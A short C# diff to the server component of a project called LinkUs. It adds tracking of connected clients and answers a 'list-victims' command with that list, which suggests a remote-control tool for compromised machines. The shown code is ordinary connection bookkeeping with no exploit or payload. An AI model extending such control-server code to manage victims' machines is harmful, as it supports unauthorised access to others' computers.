@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Text;
@@ -10,6 +11,7 @@ namespace LinkUs
     {
         private static readonly UTF8Encoding Encoding = new UTF8Encoding();
         private readonly Connector _connector;
+        private readonly List<ClientId> _connectedClients = new List<ClientId>();
 
         // ----- Constructor
         public Server(Connector connector)
@@ -33,16 +35,18 @@ namespace LinkUs
         // ----- Event callbacks
         private void ConnectorOnClientConnected(ClientId clientId)
         {
-            var package = new Package(ClientId.Server, clientId, Encoding.GetBytes("identification"));
-            _connector.SendDataAsync(package);
+            _connectedClients.Add(clientId);
         }
-        private void ConnectorOnClientDisconnected(ClientId clientId) { }
+        private void ConnectorOnClientDisconnected(ClientId clientId)
+        {
+            _connectedClients.Remove(clientId);
+        }
         private void ConnectorOnPackageReceived(Package package)
         {
             if (Equals(package.Destination, ClientId.Server)) {
                 var commandLine = Encoding.GetString(package.Content);
                 if (commandLine == "list-victims") {
-                    var clients = _connector.GetClients();
+                    var clients = _connectedClients;
                     var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                     var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(value));
                     _connector.SendDataAsync(packageResponse);
